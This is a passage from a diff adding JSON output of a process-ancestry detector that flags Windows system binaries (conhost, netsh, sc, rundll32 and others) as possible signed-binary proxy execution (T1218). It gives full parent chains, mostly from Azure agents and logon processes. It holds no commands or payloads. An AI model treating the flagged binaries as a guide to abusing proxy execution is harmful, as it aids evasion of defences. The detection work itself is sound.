+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b7d-5ead-6800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b81-5ead-6e00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b85-5ead-7600-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\ipconfig.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b86-5ead-7800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\ROUTE.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b86-5ead-7a00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\ARP.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b87-5ead-7c00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b8b-5ead-7f00-000000000500",
+          "image": "C:\\Windows\\System32\\netsh.exe",
+          "lolbin_name": "netsh.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1421.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b8b-5ead-8000-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1421.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b8c-5ead-8200-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b8e-5ead-8400-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b90-5ead-8700-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\Telemetry\\WindowsAzureTelemetryService.exe",
+            "C:\\Windows\\System32\\ipconfig.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b91-5ead-8900-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\Telemetry\\WindowsAzureTelemetryService.exe",
+            "C:\\Windows\\System32\\ROUTE.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b94-5ead-8b00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\Telemetry\\WindowsAzureTelemetryService.exe",
+            "C:\\Windows\\System32\\ARP.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b98-5ead-8f00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b99-5ead-9100-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b9a-5ead-9500-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2b9a-5ead-9600-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2ba4-5ead-a300-000000000500",
+          "image": "C:\\Windows\\explorer.exe",
+          "lolbin_name": "explorer.exe",
+          "chain_length_nodes": 5,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2ba5-5ead-a500-000000000500",
+          "image": "C:\\Windows\\System32\\sc.exe",
+          "lolbin_name": "sc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2ba6-5ead-a700-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bac-5ead-aa00-000000000500",
+          "image": "C:\\Windows\\System32\\sc.exe",
+          "lolbin_name": "sc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bae-5ead-ac00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bb0-5ead-af00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\BfeToolWin8.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bb2-5ead-b200-000000000500",
+          "image": "C:\\Windows\\System32\\sc.exe",
+          "lolbin_name": "sc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bb5-5ead-b400-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bba-5ead-b800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\FindVolume\\FindVolume.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bc0-5ead-c300-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\ipconfig.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bc2-5ead-c700-000000000500",
+          "image": "C:\\Windows\\System32\\wlrmdr.exe",
+          "lolbin_name": "wlrmdr.exe",
+          "chain_length_nodes": 4,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\wlrmdr.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bc8-5ead-ca00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\ROUTE.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bcd-5ead-cd00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\ARP.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bce-5ead-d100-000000000500",
+          "image": "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
+          "lolbin_name": "update.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\Update.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bcf-5ead-d200-000000000500",
+          "image": "C:\\Windows\\System32\\rundll32.exe",
+          "lolbin_name": "rundll32.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\rundll32.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bd1-5ead-d300-000000000500",
+          "image": "C:\\Windows\\SysWOW64\\runonce.exe",
+          "lolbin_name": "runonce.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\SysWOW64\\runonce.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bdc-5ead-d600-000000000500",
+          "image": "C:\\Program Files (x86)\\Teams Installer\\Teams.exe",
+          "lolbin_name": "teams.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\SysWOW64\\runonce.exe",
+            "C:\\Program Files (x86)\\Teams Installer\\Teams.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2be3-5ead-d800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\dsregcmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2be5-5ead-d900-000000000500",
+          "image": "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+          "lolbin_name": "teams.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2beb-5ead-dc00-000000000500",
+          "image": "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+          "lolbin_name": "teams.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+            "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "8320f18b-2bec-5ead-dd00-000000000500",
+          "image": "C:\\Users\\dschrute\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
